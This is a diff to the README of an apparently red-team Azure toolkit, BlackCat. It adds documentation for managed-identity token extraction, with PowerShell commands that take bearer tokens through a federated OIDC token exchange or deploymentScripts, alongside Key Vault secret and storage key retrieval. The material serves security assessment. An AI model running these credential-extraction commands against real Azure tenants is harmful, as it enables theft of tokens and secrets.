@@ -189,10 +189,38 @@ These functions test whether credentials and secrets are accessible to the curre
 |----------|-----------|---------|
 | `Get-KeyVaultSecret` | T1552.001 | Retrieve secrets from accessible Key Vaults |
 | `Get-StorageAccountKey` | T1552.001 | Extract storage account access keys |
+| `Get-ManagedIdentityToken` | T1528 | Extract bearer tokens from user-assigned managed identities (deploymentScripts) |
+| `Invoke-FederatedTokenExchange` | T1528 | Extract UAMI tokens via federated credential exchange (faster, no ACI) |
 
 ```powershell
 # Enumerate Key Vaults and attempt secret retrieval
 Get-KeyVaultSecret -OutputFormat JSON
+
+# Extract managed identity token (two approaches available)
+
+# Approach 1: Federated exchange (recommended — fast, ~20-30s, no ACI dependencies)
+Invoke-FederatedTokenExchange `
+    -Name "my-uami" `
+    -ResourceGroupName "rg-prod" `
+    -IssuerUrl "https://bcoidc1a2b3c.blob.core.windows.net/oidc" `
+    -PrivateKeyPath "./blackcat-oidc.pem" `
+    -Cleanup
+
+# Approach 2: Deployment scripts (120-180s, requires ACI capacity)
+Get-ManagedIdentityToken -Name "my-uami" -ResourceGroupName "rg-prod"
+```
+
+**Managed Identity Token Extraction:** BlackCat offers two techniques to extract bearer tokens from user-assigned managed identities (UAMIs):
+
+- **`Invoke-FederatedTokenExchange`** (recommended): Uses federated identity credentials with a pre-configured OIDC issuer. Fastest method (~20-30 seconds), no Azure Container Instances (ACI) required. [Setup guide](Attacks/Federated-Token-Exchange/Invoke-FederatedTokenExchange-Setup.md) available.
+- **`Get-ManagedIdentityToken`**: Uses `Microsoft.Resources/deploymentScripts` with ACI to invoke IMDS. Takes 120-180 seconds and requires ACI capacity (which may be exhausted in certain regions).
+
+For one-time setup of the federated exchange infrastructure:
+
+```powershell
+# Pure PowerShell — no az CLI or OpenSSL required
+Connect-AzAccount
+./Attacks/Federated-Token-Exchange/Setup-FederatedTokenExchange.ps1
 ```
 
 The output includes a summary showing successful reads, RBAC denials, and policy-blocked vaults, giving an instant risk picture of your secret management posture. Results are exported to a timestamped JSON file for evidence.
